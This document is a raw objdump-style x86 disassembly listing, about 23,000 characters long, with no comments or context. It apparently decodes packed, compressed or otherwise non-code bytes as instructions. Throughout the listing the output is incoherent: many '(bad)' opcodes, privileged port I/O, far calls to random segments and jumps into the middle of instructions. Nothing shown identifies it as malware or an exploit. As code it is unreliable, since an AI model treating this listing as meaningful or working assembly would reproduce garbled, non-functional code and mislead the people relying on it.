  404fcc:	mov    edi,0x84da195d
  404fd1:	out    0x13,eax
  404fd3:	adc    ecx,ecx
  404fd5:	or     eax,0x2116b36c
  404fda:	jo     0x404f97
  404fdc:	int3   
  404fdd:	sbb    eax,0x2b4c84d4
  404fe2:	imul   ebx,DWORD PTR [bp+si+0x33],0x718b01e2
  404fea:	push   ebp
  404feb:	icebp  
  404fec:	jl     0x404f83
  404fee:	imul   esi,ebp,0xc4a8be80
  404ff4:	mov    esp,0x5387ae20
  404ff9:	pushf  
  404ffa:	xor    al,0x7f
  404ffc:	jbe    0x404f99
  404ffe:	les    edx,FWORD PTR [ebx]
  405000:	or     eax,0x5bc9c337
  405005:	inc    edx
  405006:	push   esi
  405007:	jne    0x405027
  405009:	daa    
  40500a:	xchg   BYTE PTR [ebx],al
  40500c:	pop    esp
  40500d:	int    0xf3
  40500f:	out    0x50,eax
  405011:	lea    edx,[ebx-0x23e49d2a]
  405017:	call   0xb446:0xf834190
  40501e:	push   ecx
  40501f:	mov    dh,0xa6
  405021:	mov    ebp,0xb6edfc04
  405026:	loope  0x405024
  405028:	cli    
  405029:	outs   dx,BYTE PTR ds:[esi]
  40502a:	loop   0x404ff5
  40502c:	push   edx
  40502d:	push   0x7f7c5740
  405032:	pop    ebx
  405033:	stc    
  405034:	lds    esp,FWORD PTR [ebx]
  405036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405037:	or     ecx,DWORD PTR [esi+0x9e356f9]
  40503d:	pop    esi
  40503e:	jns    0x4050be
  405040:	mov    dh,0x19
  405042:	mov    ecx,esp
  405044:	retf   
  405045:	int3   
  405046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405047:	lods   al,BYTE PTR ds:[esi]
  405048:	shr    BYTE PTR [edi-0x3eb2ce45],1
  40504e:	fwait
  40504f:	push   cs
  405050:	pop    esi
  405051:	in     al,0xdc
  405053:	push   ss
  405054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405055:	or     al,BYTE PTR [eax-0x67]
  405058:	push   esp
  405059:	(bad)  
  40505a:	out    dx,al
  40505b:	cwde   
  40505c:	arpl   dx,bx
  40505e:	ret    0xd8da
  405061:	push   esi
  405062:	call   0x58b2ac52
  405067:	out    0x54,eax
  405069:	dec    DWORD PTR [ebp-0x2f54e08a]
  40506f:	mov    ebx,0x3b28ff87
  405074:	add    BYTE PTR [ecx+eiz*2-0x62],0x13
  405079:	nop
  40507a:	mov    ebp,0x4bf1dcdd
  40507f:	sub    esp,0x8956c59
  405085:	(bad)  
  405086:	xlat   BYTE PTR ds:[ebx]
  405087:	cmp    ebp,DWORD PTR [ecx-0x3d]
  40508a:	sub    ecx,0xef5ea7dc
  405090:	pop    ss
  405091:	xor    dh,BYTE PTR [esi]
  405093:	call   0xdca4ec04
  405098:	lods   eax,DWORD PTR ds:[esi]
  405099:	out    dx,eax
  40509a:	pop    ecx
  40509b:	push   ebp
  40509c:	mov    ch,al
  40509e:	ins    BYTE PTR es:[edi],dx
  40509f:	jge    0x40505c
  4050a1:	jle    0x40506e
  4050a3:	and    BYTE PTR [eax-0x2a2559cf],dh
  4050a9:	not    ebp
  4050ab:	jmp    0x40506e
  4050ad:	jg     0x405073
  4050af:	lea    esp,[esi-0x33]
  4050b2:	xor    eax,DWORD PTR [ecx]
  4050b4:	fbstp  TBYTE PTR [ecx]
  4050b6:	dec    ecx
  4050b7:	sbb    edi,DWORD PTR [eax+0x33c905af]
  4050bd:	xchg   ebx,eax
  4050be:	pusha  
  4050bf:	fldl2e 
  4050c1:	mov    BYTE PTR [ecx+0x6],dh
  4050c4:	test   DWORD PTR [esi+0x3c],ecx
  4050c7:	arpl   WORD PTR [edi+0x70055d52],sp
  4050cd:	cmc    
  4050ce:	push   edi
  4050cf:	ja     0x405055
  4050d1:	call   DWORD PTR [edx-0xf]
  4050d4:	(bad)  
  4050d5:	cmp    bl,bh
  4050d7:	retf   
  4050d8:	sbb    DWORD PTR [eax],0xffffff89
  4050db:	es call 0x7f13a451
  4050e1:	and    cl,dh
  4050e3:	(bad)  
  4050e4:	push   ds
  4050e5:	mov    edi,0xba134175
  4050ea:	dec    ecx
  4050eb:	push   ss
  4050ec:	mov    DWORD PTR [ebx-0xf],ebp
  4050ef:	dec    esp
  4050f0:	adc    bh,dh
  4050f2:	loopne 0x4050a4
  4050f4:	fwait
  4050f5:	adc    esi,edi
  4050f7:	push   es
  4050f8:	mov    ds,edi
  4050fa:	aaa    
  4050fb:	xchg   dh,cl
  4050fd:	mov    esp,0x9365da08
  405102:	inc    edx
  405103:	test   BYTE PTR [ebp-0x55586f62],ah
  405109:	sub    al,0x5a
  40510b:	sbb    ebx,edi
  40510d:	mov    edi,0x6f179421
  405112:	mov    al,ds:0x48fade32
  405117:	xchg   BYTE PTR [esp+eax*4+0x7f],bl
  40511b:	jle    0x4050c5
  40511d:	call   0x1907e6bf
  405122:	xor    esp,DWORD PTR [ecx]
  405124:	arpl   WORD PTR [eax-0x1b],ax
  405127:	mov    ebp,0x68ba0401
  40512c:	and    al,0x52
  40512e:	ficomp DWORD PTR [ecx]
  405130:	push   ebx
  405131:	or     al,BYTE PTR [ecx-0x264982e3]
  405137:	sub    eax,0x3cc0cf26
  40513c:	pop    ds
  40513d:	or     ecx,DWORD PTR [edx]
  40513f:	gs pop ax
  405142:	push   esi
  405143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405144:	inc    eax
  405145:	jne    0x4051a9
  405147:	repz push di
  40514a:	pop    ebp
  40514b:	fisttp WORD PTR [edi+esi*4-0xc]
  40514f:	fwait
  405150:	dec    esp
  405151:	(bad)  
  405153:	aas    
  405154:	es add eax,0xfdacc622
  40515a:	(bad)  [eax-0xb]
  40515d:	jo     0x40511e
  40515f:	sub    eax,0x27eae58c
  405164:	ret    0x487a
  405167:	ret    0x3f79
  40516a:	(bad)  
  40516c:	cli    
  40516d:	and    eax,0xdc2f6564
  405172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405173:	jge    0x4051cb
  405175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405176:	mov    eax,ds:0xbffa2250
  40517b:	xchg   edi,eax
  40517c:	dec    edx
  40517d:	dec    edi
  40517e:	nop
  40517f:	and    eax,DWORD PTR [esi+0x2ef8c3db]
  405185:	mov    ds:0xeca0f842,eax
  40518a:	jle    0x40517b
  40518c:	lods   al,BYTE PTR fs:[esi]
  40518e:	mov    ?,WORD PTR ss:[ebx+0x18]
  405192:	fmul   QWORD PTR [ecx+edi*2+0xf]
  405196:	adc    ecx,DWORD PTR ds:[eax]
  405199:	ds lock adc eax,0x13b4f54b
  4051a0:	inc    ecx
  4051a1:	pop    ds
  4051a2:	std    
  4051a3:	in     al,0x3c
  4051a5:	jne    0x4051be
  4051a7:	xchg   BYTE PTR [ebx+0x5bae77cd],ah
  4051ad:	cmp    eax,0x4bbf64b
  4051b2:	adc    ah,ch
  4051b4:	(bad)  
  4051b5:	pop    esp
  4051b6:	jecxz  0x4051be
  4051b8:	int    0x78
  4051ba:	outs   dx,DWORD PTR ds:[esi]
  4051bb:	push   es
  4051bc:	js     0x4051c6
  4051be:	shr    dh,cl
  4051c0:	mov    cl,dl
  4051c2:	xchg   DWORD PTR [edx-0x71e06fdc],edi
  4051c8:	sar    DWORD PTR [esi-0x31],1
  4051cb:	cdq    
  4051cc:	cmp    eax,0x96071c0a
  4051d1:	out    0xbb,eax
  4051d3:	fiadd  WORD PTR [esi+0x6ca40f33]
  4051d9:	cmp    dh,BYTE PTR [edi+0x4b]
  4051dc:	jge    0x4051c3
  4051de:	xor    al,0xe7
  4051e0:	push   ss
  4051e1:	ins    DWORD PTR es:[edi],dx
  4051e2:	mov    bh,0xb7
  4051e4:	mov    ecx,0xce9c36ee
  4051e9:	fcomip st,st(4)
  4051eb:	test   eax,0x51aa696
  4051f0:	adc    eax,0xeeea1779
  4051f5:	ret    
  4051f6:	lods   al,BYTE PTR ds:[esi]
  4051f7:	ja     0x4051ff
  4051f9:	xchg   edi,eax
  4051fa:	cs add al,0x1e
  4051fd:	mov    al,ds:0xf8b1051d
  405202:	push   0xffffffbd
  405204:	mov    WORD PTR [ebp+0x5f29a393],?
  40520a:	jb     0x4051d3
  40520c:	pop    ds
  40520d:	pop    ecx
  40520e:	and    eax,0xea7ffa8e
  405213:	and    eax,0x39cf1c92
  405218:	test   DWORD PTR [ebx],ebp
  40521a:	pop    ss
  40521b:	xchg   edi,eax
  40521c:	or     eax,0xf00c5ee3
  405221:	mov    dl,0x9c
  405223:	loope  0x40529f
  405225:	or     al,0x45
  405227:	leave  
  405228:	fadd   st,st(1)
  40522a:	dec    edx
  40522b:	jmp    0x40524a
  40522d:	ret    0x1ea5
  405230:	push   ds
  405231:	push   edx
  405232:	into   
  405233:	popa   
  405234:	push   ebx
  405235:	xchg   edi,eax
  405236:	loop   0x40525a
  405238:	call   0x41e0:0x58b06d62
  40523f:	mov    dl,0xf5
  405241:	add    DWORD PTR [edi-0x76],ecx
  405244:	ja     0x4051eb
  405246:	xchg   edi,eax
  405247:	add    eax,0x6706f215
  40524c:	loope  0x405207
  40524e:	clc    
  40524f:	ins    BYTE PTR es:[edi],dx
  405250:	and    al,0x14
  405252:	rcl    DWORD PTR [ebx+0x3a],0x72
  405256:	in     al,dx
  405257:	or     esi,DWORD PTR [ecx+0x3d]
  40525a:	stos   DWORD PTR es:[edi],eax
  40525b:	fld    QWORD PTR [ecx-0x3b]
  40525e:	call   0xe52b2237
  405263:	push   ecx
  405264:	(bad)  
  405265:	fistp  DWORD PTR [ebp+0x1b3a8255]
  40526b:	retf   0x93be
  40526e:	pop    eax
  40526f:	iret   
  405270:	mov    ds:0x969ae6e1,eax
  405275:	mov    eax,ds:0x7ace638f
  40527a:	xor    bl,ah
  40527c:	add    DWORD PTR [eax-0x39],ecx
  40527f:	fisttp QWORD PTR [edi+0x444b05b8]
  405285:	in     eax,0x73
  405287:	inc    ecx
  405288:	fld    DWORD PTR fs:[edi-0x76b2751]
  40528f:	adc    DWORD PTR [edi+0x64],0xf9e2c92f
  405296:	cmp    al,0x3a
  405298:	and    ah,BYTE PTR [ecx+0x6b0a133a]
  40529e:	in     al,0x6b
  4052a0:	leave  
  4052a1:	cmp    ebx,DWORD PTR [eax+eax*2-0x2a7eba56]
  4052a8:	and    bl,0xdf
  4052ab:	mov    cl,0xb3
  4052ad:	push   edx
  4052ae:	xor    ebp,DWORD PTR [ecx+edx*2]
  4052b1:	rol    DWORD PTR [ebp-0x6d],1
  4052b4:	push   cs
  4052b5:	push   eax
  4052b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b7:	mov    al,ds:0x6f88a7c7
  4052bc:	lea    edi,[edi]
  4052be:	sar    edx,1
  4052c0:	mov    cl,0xc7
  4052c2:	lds    edx,FWORD PTR ds:0x895a8772
  4052c8:	das    
  4052c9:	mov    esi,0xbde4102f
  4052ce:	ins    DWORD PTR es:[edi],dx
  4052cf:	xor    DWORD PTR [esi+0x23],esp
  4052d2:	jle    0x405334
  4052d4:	xchg   BYTE PTR [esp+ebx*8+0x4bbe8225],dh
  4052db:	mov    dl,0x8c
  4052dd:	sbb    eax,0xd6be7416
  4052e2:	ins    BYTE PTR es:[edi],dx
  4052e3:	cli    
  4052e4:	jmp    0x405365
  4052e6:	imul   DWORD PTR [ecx]
  4052e8:	push   cs
  4052e9:	in     al,dx
  4052ea:	cmp    edx,DWORD PTR [esi-0x39]
  4052ed:	xchg   edi,eax
  4052ee:	push   ecx
  4052ef:	in     eax,0x9a
  4052f1:	js     0x4052dd
  4052f3:	test   eax,0xe78819ac
  4052f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052f9:	jge    0x405326
  4052fb:	repnz out 0x5d,eax
  4052fe:	cld    
  4052ff:	mov    DWORD PTR ds:0xfc5013d8,edx
  405305:	outs   dx,BYTE PTR ds:[esi]
  405306:	fistp  WORD PTR [eax]
  405308:	popa   
  405309:	or     eax,0xd32ab72
  40530e:	int3   
  40530f:	inc    ecx
  405310:	sbb    ecx,DWORD PTR [ebx]
  405312:	pop    esi
  405313:	xchg   ebx,eax
  405314:	push   0xab80eacc
  405319:	push   es
  40531a:	xor    BYTE PTR cs:[eax+0x23],ch
  40531e:	ja     0x4052be
  405320:	inc    edi
  405321:	pop    ds
  405322:	mov    eax,0xafb4bcf5
  405327:	lea    esi,[ecx]
  405329:	iret   
  40532a:	or     BYTE PTR [ebx],bh
  40532c:	popa   
  40532d:	push   eax
  40532e:	sbb    BYTE PTR [esi],dl
  405330:	ds inc esp
  405332:	mov    ch,0xa1
  405334:	stos   DWORD PTR es:[edi],eax
  405335:	or     eax,0x3b7a9f50
  40533a:	shr    DWORD PTR [edx],1
  40533c:	jmp    0x4053ba
  40533e:	add    BYTE PTR [edx-0x54bad193],ah
  405344:	cmc    
  405345:	and    ah,BYTE PTR [edi+0x64]
  405348:	or     bh,BYTE PTR [ebp+esi*4+0x1737d7a6]
  40534f:	push   edx
  405350:	push   ss
  405351:	(bad)  
  405353:	icebp  
  405354:	in     eax,0xb8
  405356:	int3   
  405357:	in     eax,0xc5
  405359:	xchg   ecx,eax
  40535a:	lods   al,BYTE PTR ds:[esi]
  40535b:	mov    ebx,0x1362172e
  405360:	loop   0x40539e
  405362:	into   
  405363:	inc    edx
  405364:	popa   
  405365:	sbb    DWORD PTR [ecx],esi
  405367:	ds push cs
  405369:	xchg   ebp,eax
  40536a:	bnd jo 0x40532c
  40536d:	mov    ebp,0xe52c9c0
  405372:	loop   0x405301
  405374:	js     0x405349
  405376:	and    ah,BYTE PTR [ebx+esi*4]
  405379:	and    dx,WORD PTR [edi-0x5]
  40537d:	retf   
  40537e:	jp     0x405343
  405380:	push   ecx
  405381:	add    al,0x76
  405383:	mov    al,ds:0xdf12f236
  405388:	scas   al,BYTE PTR es:[edi]
  405389:	jle    0x40537b
  40538b:	mov    BYTE PTR [eax],dh
  40538d:	arpl   WORD PTR [ecx+eax*2],bp
  405390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405391:	icebp  
  405392:	dec    ebx
  405393:	mov    ebx,0xec268eb5
  405398:	mov    esi,0xa4fd09d6
  40539d:	icebp  
  40539e:	adc    al,BYTE PTR [eax]
  4053a0:	(bad)  
  4053a2:	loopne 0x40539b
  4053a4:	adc    BYTE PTR [ebx+0x1e],bh
  4053a7:	push   ss
  4053a8:	mov    edi,0x8d2abf14
  4053ad:	jne    0x405367
  4053af:	ins    DWORD PTR es:[edi],dx
  4053b0:	cld    
  4053b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b2:	jge    0x4053a5
  4053b4:	push   ebp
  4053b5:	push   ebp
  4053b6:	in     al,0xa
  4053b8:	icebp  
  4053b9:	das    
  4053ba:	test   al,0x3e
  4053bc:	xchg   ebx,eax
  4053bd:	add    dh,BYTE PTR [eax-0x68078c8a]
  4053c3:	pop    ebp
  4053c4:	jne    0x40534c
  4053c6:	add    esi,0x41
  4053c9:	add    DWORD PTR [eax],eax
  4053cb:	clc    
  4053cc:	xchg   ebx,eax
  4053cd:	adc    BYTE PTR [ebx+eax*4+0x6c74b51],ah
  4053d4:	mov    esi,gs
  4053d6:	(bad)  
  4053d7:	lock mov ch,0x20
  4053da:	mov    ebp,0xd2f2c3a9
  4053df:	push   edi
  4053e0:	gs jmp 0x8b7d:0xcefa4796
  4053e8:	jp     0x405410
  4053ea:	mov    al,0x18
  4053ec:	or     esi,eax
  4053ee:	jb     0x405449
  4053f0:	test   DWORD PTR [eax+0x6b],esi
  4053f3:	bound  eax,QWORD PTR [edi-0x2144815b]
  4053f9:	fst    st(7)
  4053fb:	sub    ebp,DWORD PTR ds:0x1e845be8
  405401:	fisttp WORD PTR [esi]
  405403:	and    al,0x7e
  405405:	mov    eax,ds:0xce938208
  40540a:	mov    BYTE PTR [ebx-0x7f],bh
  40540d:	aam    0xdd
  40540f:	rol    BYTE PTR [ecx],1
  405411:	push   es
  405412:	dec    edx
  405413:	out    0x42,al
  405415:	arpl   WORD PTR [ecx],bp
  405417:	addr16 test al,0xe4
  40541a:	mov    al,0x8b
  40541c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40541d:	and    al,0x10
  40541f:	pop    ecx
  405420:	sbb    BYTE PTR [esi-0x7b],0xdd
  405424:	je     0x405499
  405426:	clc    
  405427:	gs mov edx,0x18092400
  40542d:	pop    edx
  40542e:	retf   
  40542f:	xor    BYTE PTR [ebx+0x4333ca09],0x3f
  405436:	in     al,dx
  405437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405438:	dec    ecx
  405439:	aad    0x17
  40543b:	mov    WORD PTR [eax+0x26],fs
  40543e:	mov    ebx,0xdb578482
  405443:	gs aam 0xd6
  405446:	sbb    eax,0xec49ccf9
  40544b:	aas    
  40544c:	cmp    eax,0xf65e59dd
  405451:	sahf   
  405452:	in     eax,dx
  405453:	inc    edx
  405454:	cmp    dh,BYTE PTR [edi+0x4d]
  405457:	outs   dx,DWORD PTR ds:[esi]
  405458:	sub    bl,cl
  40545a:	mov    bh,BYTE PTR [esi+0x57c6177c]
  405460:	jecxz  0x4053fa
  405462:	aad    0x8
  405464:	std    
  405465:	hlt    
  405466:	test   eax,0xe90d73fa
  40546b:	mov    fs,WORD PTR [edi+0x5e85c257]
  405471:	xchg   ebx,eax
  405472:	sub    eax,0xc6610ea9
  405477:	xchg   esp,eax
  405478:	test   cl,bl
  40547a:	sti    
  40547b:	in     al,dx
  40547c:	mov    al,ds:0xe8873db
  405481:	leave  
  405482:	sbb    BYTE PTR [eax+0xeefe36],0xa2
  405489:	sbb    BYTE PTR [ebp-0x32],bl
  40548c:	(bad)  
  40548d:	fistp  DWORD PTR [ecx+0x24]
  405490:	(bad)  
  405491:	adc    ch,BYTE PTR [esp+edx*4]
  405494:	xchg   edi,eax
  405495:	or     bh,BYTE PTR [ecx]
  405497:	pop    ds
  405498:	mov    ebx,0x8b814d02
  40549d:	rcl    DWORD PTR [ebx-0x59],1
  4054a0:	cmp    edi,DWORD PTR [ebx]
  4054a2:	jbe    0x405481
  4054a4:	inc    ecx
  4054a5:	neg    DWORD PTR [esi-0x10]
  4054a8:	cld    
  4054a9:	push   ss
  4054aa:	add    edx,DWORD PTR [eax+ebx*1]
  4054ad:	push   edi
  4054ae:	xchg   edx,eax
  4054af:	rol    DWORD PTR [edx-0x71],cl
  4054b2:	jl     0x405454
  4054b4:	sub    DWORD PTR [ecx-0x45523c54],ecx
  4054ba:	in     al,dx
  4054bb:	mov    dh,0x9b
  4054bd:	shl    ebp,0xee
  4054c0:	pop    eax
  4054c1:	push   0x5b7340fc
  4054c6:	xchg   BYTE PTR [eax+0x26f98cae],bh
  4054cc:	or     BYTE PTR [esp+edx*4-0x6d1e7147],dh
  4054d3:	mov    dl,BYTE PTR [edx]
  4054d5:	loop   0x4054d8
  4054d7:	inc    ebx
  4054d8:	ins    DWORD PTR es:[edi],dx
  4054d9:	inc    ecx
  4054da:	mov    al,0x5e
  4054dc:	clc    
  4054dd:	ja     0x40555c
  4054df:	aad    0x2
  4054e1:	stos   BYTE PTR es:[edi],al
  4054e2:	pop    eax
  4054e3:	jo     0x405536
  4054e5:	out    0x51,al
  4054e7:	sub    dl,BYTE PTR [ebx+0x5b7201ee]
  4054ed:	xor    BYTE PTR [ebx],0x39
  4054f0:	inc    esp
  4054f1:	mov    bh,0xc5
  4054f3:	dec    esp
  4054f4:	(bad)  
  4054f5:	ins    BYTE PTR es:[edi],dx
  4054f6:	pusha  
  4054f7:	popa   
  4054f8:	std    
  4054f9:	or     BYTE PTR [edx+0x46],cl
  4054fc:	test   eax,0xa33e3edf
  405501:	mov    eax,0xcfb30718
  405506:	aas    
  405507:	outs   dx,DWORD PTR ds:[esi]
  405508:	es and al,0xeb
  40550b:	sub    ecx,ebx
  40550d:	pop    ss
  40550e:	dec    ecx
  40550f:	lea    ebx,[edi+0x66]
  405512:	mov    ah,0xf7
  405514:	or     ebx,eax
  405516:	jne    0x4054a8
  405518:	dec    esi
  405519:	dec    edx
  40551a:	inc    eax
  40551b:	lock pop esp
  40551d:	mov    bl,0xf4
  40551f:	jno    0x405567
  405521:	mov    esp,0xdd61ee69
  405526:	stc    
  405527:	mov    eax,0xb5ad3415
  40552c:	lods   al,BYTE PTR ds:[esi]
  40552d:	xchg   edi,eax
  40552e:	mov    ds:0x67989db7,al
  405533:	mov    DWORD PTR [esi],eax
  405535:	daa    
  405536:	cmp    edx,DWORD PTR [edx+0x44546513]
  40553c:	outs   dx,DWORD PTR ds:[esi]
  40553d:	adc    eax,0x931fb07c
  405542:	test   cl,dl
  405544:	in     al,dx
  405545:	and    BYTE PTR [esi],bl
  405547:	sbb    eax,DWORD PTR [ebp+0x33]
  40554a:	push   0xffffffcd
  40554c:	sbb    BYTE PTR [eax+0x5997eeb1],al
  405552:	int3   
  405553:	sub    eax,0xede20a9c
  405558:	adc    al,ah
  40555a:	sbb    BYTE PTR [esi+0x37],al
  40555d:	sahf   
  40555e:	icebp  
  40555f:	pop    esi
  405560:	add    ecx,DWORD PTR [esi+0x78bc7a2]
  405566:	fisubr WORD PTR [esi]
  405568:	jl     0x4055da
  40556a:	(bad)  
  40556c:	and    al,0xc0
  40556e:	stc    
  40556f:	sbb    al,0x9a
  405571:	ficom  WORD PTR [esp+ecx*8]
  405574:	in     eax,dx
  405575:	mov    ebp,DWORD PTR [ebx+0x588b3207]
  40557b:	xchg   edx,eax
  40557c:	add    BYTE PTR [edi-0xf],dh
  40557f:	cld    
  405580:	out    0x43,eax
  405582:	ret    
  405583:	jo     0x40555c
  405585:	sbb    eax,0xdffed86e
  40558a:	or     al,0xd4
  40558c:	addr16 in al,0xb8
  40558f:	lods   al,BYTE PTR ds:[esi]
  405590:	scas   al,BYTE PTR es:[edi]
  405591:	sar    dl,cl
  405593:	add    al,0x58
  405595:	xchg   esp,eax
  405596:	pop    esi
  405597:	iret   
  405598:	and    ah,ah
  40559a:	lds    esp,FWORD PTR [eax+ebp*8]
  40559d:	sahf   
  40559e:	mov    ds:0x8945966a,al
  4055a3:	ficom  DWORD PTR [edi-0x33]
  4055a6:	stc    
  4055a7:	mov    cs,ebx
  4055a9:	hlt    
  4055aa:	inc    edx
  4055ab:	mov    ebx,0xfe2cadee
  4055b0:	int    0x29
  4055b2:	inc    esp
  4055b3:	imul   esi,DWORD PTR [ebp+0x35af6905],0x6
  4055ba:	test   BYTE PTR [edi+0x5efbab3f],al
  4055c0:	mov    esp,0xe6413a56
  4055c5:	add    BYTE PTR [edx+0x90eaa3e],bl
  4055cb:	jb     0x40559c
  4055cd:	jl     0x4055e6
  4055cf:	adc    esp,ebx
  4055d1:	fnstenv [ecx]
  4055d3:	stos   BYTE PTR es:[edi],al
  4055d4:	lea    esi,[eax+0x1c]
  4055d7:	jmp    0x405562
  4055d9:	inc    ebp
  4055da:	leave  
  4055db:	inc    esp
  4055dc:	mov    ebx,0xfa6edb6d
  4055e1:	rcr    esi,cl
  4055e3:	int    0x69
  4055e5:	xchg   BYTE PTR [edi],cl
  4055e7:	scas   eax,DWORD PTR es:[edi]
  4055e8:	cld    
  4055e9:	add    al,0x51
  4055eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055ec:	adc    eax,0x8f99d670
  4055f1:	push   ecx
  4055f2:	sub    BYTE PTR [eax+0x57fcc1f1],cl
  4055f8:	or     dl,ch
  4055fa:	pop    edx
  4055fb:	inc    ebp
  4055fc:	lock mov ebx,esi
  4055ff:	lods   al,BYTE PTR ds:[esi]
  405600:	and    DWORD PTR [esi-0x53],eax
  405603:	and    BYTE PTR [eax+ecx*4],ah
  405606:	xlat   BYTE PTR ds:[ebx]
  405607:	inc    esp
  405608:	mov    bl,0x6b
  40560a:	ds push es
  40560c:	dec    esi
  40560d:	mov    esp,0xc2b387ce
  405612:	add    BYTE PTR [eax],0x8e
  405615:	mov    WORD PTR [ebx+ebp*2+0x27],cs
  405619:	xchg   esi,eax
  40561a:	jnp    0x40562d
  40561c:	jnp    0x405625
  40561e:	cld    
  40561f:	aas    
  405620:	fild   WORD PTR [edi]
  405622:	pop    ebx
  405623:	or     DWORD PTR [ebx],esp
  405625:	scas   eax,DWORD PTR es:[edi]
  405626:	test   DWORD PTR [edi+eax*1],edx
  405629:	push   es
  40562a:	xchg   esp,eax
  40562b:	std    
  40562c:	sub    eax,0xfedf667d
  405631:	mul    DWORD PTR [edx-0x75d49bec]
  405637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405638:	add    al,0x75
  40563a:	ret    0x6125
  40563d:	into   
  40563e:	adc    cl,BYTE PTR [ebx]
  405640:	loopne 0x40565d
  405642:	push   ds
  405643:	aam    0xff
  405645:	cdq    
  405646:	xor    DWORD PTR [edx+0x4e81300e],0xe8c9bada
  405650:	outs   dx,DWORD PTR ds:[esi]
  405651:	lahf   
  405652:	sub    DWORD PTR [ecx+edx*4-0x62],eax
  405656:	mov    ecx,0x54fa3c25
  40565b:	cmp    BYTE PTR [edi],ah
  40565d:	push   es
  40565e:	and    al,0x57
  405660:	nop
  405661:	movntps XMMWORD PTR [eax+0x30],xmm5
  405665:	dec    esi
  405666:	pop    eax
  405667:	or     ebp,DWORD PTR [edx]
  405669:	sbb    al,0x54
  40566b:	inc    esi
  40566c:	stc    
  40566d:	cmp    BYTE PTR [edi-0x6a31c1ef],dl
  405673:	pushf  
  405674:	pop    edx
  405675:	shl    BYTE PTR [esi],0x46
  405678:	pop    ds
  405679:	out    0xde,eax
  40567b:	inc    ecx
  40567c:	icebp  
  40567d:	rol    bl,1
  40567f:	push   edi
  405680:	mov    esi,0xf98dac4d
  405685:	ror    BYTE PTR [edx+0x44],0x8c
  405689:	pushf  
  40568a:	and    BYTE PTR [ecx],0xdb
  40568d:	sub    al,0x1b
  40568f:	or     al,0x2d
  405691:	(bad)  
  405692:	adc    eax,0x6e7724f1
  405697:	in     eax,dx
  405698:	mov    esi,0xa5503e7b
  40569d:	push   0xffffffcb
  40569f:	nop
  4056a0:	dec    eax
  4056a1:	fnsave [ebp-0x5f]
  4056a4:	or     DWORD PTR [esi+0x4a],eax
  4056a7:	data16 rcl BYTE PTR [edi-0x48],cl
  4056ab:	mov    BYTE PTR [ecx+0x36],dh
  4056ae:	xlat   BYTE PTR ds:[ebx]
  4056af:	adc    DWORD PTR [esi+ebx*4+0x4efb3938],ebx
  4056b6:	or     edi,DWORD PTR [edi-0x56a36a2f]
  4056bc:	mov    ds:0xd8e9a313,al
  4056c1:	ja     0x405726
  4056c3:	hlt    
  4056c4:	mov    DWORD PTR [eax-0x3d],esp
  4056c7:	push   0xffffffac
  4056c9:	adc    DWORD PTR [esi-0x42],esi
  4056cc:	or     DWORD PTR [esi],edx
  4056ce:	fist   DWORD PTR [esi+ebx*4+0x54]
  4056d2:	lea    edi,[eax]
  4056d4:	std    
  4056d5:	add    eax,0x31eff95a
  4056da:	outs   dx,DWORD PTR ds:[esi]
  4056db:	sbb    eax,0xe1dedaf8
  4056e0:	and    al,0xc3
  4056e2:	adc    edx,DWORD PTR [eax+0x76]
  4056e5:	frstor [ebp-0x36]
  4056e8:	push   eax
  4056e9:	xor    BYTE PTR [edi+0x34ec56e1],ah
  4056ef:	jo     0x40570e
  4056f1:	jmp    0x9ed6:0x2089c6f6
  4056f8:	and    eax,0x91fab730
  4056fd:	ror    DWORD PTR [ebp-0x76],1
  405700:	jmp    0x405684
  405702:	xchg   edi,eax
  405703:	je     0x40576c
  405705:	jmp    0x2a3ec4d
  40570a:	jl     0x405789
  40570c:	mov    al,ds:0x215857c3
  405711:	jg     0x4056dd
  405713:	retf   0x979e
  405716:	in     al,dx
  405717:	retf   
  405718:	dec    esp
  405719:	fnstenv [esi+0x56]
  40571c:	ret    
  40571d:	push   esp
  40571e:	lds    edx,FWORD PTR ds:0x39f1384f
  405724:	loopne 0x4056ca
  405726:	mov    esi,0xb54cb4dc
  40572b:	xor    al,0xa0
  40572d:	lock out dx,eax
  40572f:	rcl    BYTE PTR [esi+0x3587e166],cl
  405735:	aad    0x7
  405737:	jo     0x40572d
  405739:	loope  0x4057af
  40573b:	mov    ds:0xb1ff9824,al
  405740:	mov    dl,0x45
  405742:	mov    ax,0x4508
  405746:	dec    eax
  405747:	fidiv  DWORD PTR [ebx+esi*4-0x7746847]
  40574e:	pushf  
  40574f:	out    0x4a,al
  405751:	ret    0x98e1
  405754:	xchg   edi,eax
  405755:	les    eax,FWORD PTR [edi+0x14]
  405758:	lock jo 0x8bd1195b
  40575f:	jne    0x40574d
  405761:	pop    ecx
  405762:	jle    0x4057a8
  405764:	dec    ecx
  405765:	jmp    0x405749
  405767:	cwde   
  405768:	sbb    DWORD PTR [esi-0x5a00c3a7],ebp
  40576e:	cdq    
  40576f:	fadd   DWORD PTR [edi]
  405771:	cmp    ch,al
  405773:	mov    ch,0xe8
  405775:	inc    edx
  405776:	xlat   BYTE PTR ds:[ebx]
  405777:	and    ecx,DWORD PTR [edx+0x286e2233]
  40577d:	int    0x7b
  40577f:	jp     0x4057fb
  405781:	out    dx,al
  405782:	repnz fisub DWORD PTR [ebp+edx*1-0x31]
  405787:	mov    cl,0x45
  405789:	bound  esi,QWORD PTR ds:0x636c273c
  40578f:	nop
  405790:	imul   ebx,DWORD PTR [ebx+0x3b],0x50
  405794:	aaa    
  405795:	shl    DWORD PTR [edi+0x1c4421c3],1
  40579b:	jns    0x405803
  40579d:	mov    ?,esi
  40579f:	enter  0x9bc1,0x19
  4057a3:	aad    0x1e
  4057a5:	push   ss
  4057a6:	cmp    esi,DWORD PTR [edx]
